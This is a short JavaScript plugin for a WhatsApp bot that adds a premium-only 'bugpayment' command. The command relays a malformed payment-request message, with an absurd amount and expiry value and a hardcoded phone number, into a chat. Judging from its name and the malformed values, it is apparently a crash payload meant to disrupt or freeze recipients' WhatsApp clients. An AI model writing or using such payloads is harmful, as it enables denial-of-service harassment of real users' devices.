let fs = require('fs')

let handler = async(m, { conn, usedPrefix, command, text }) => {
    conn.relayMessage(m.chat, { requestPaymentMessage: { Message: { TextMessage: { text: `ya`, currencyCodeIso4217: 'IDR', requestFrom: '6283821123163@s.whatsapp.net', expiryTimestamp: 6283821123163, amount: 6283821123163, background: fs.readFileSync('./src/logo.jpg') }}}}, {})
}
handler.command = /^(bugpayment)$/i
handler.premium = true
handler.tags = ['premium']
handler.help = ['bugpayment']

module.exports = handler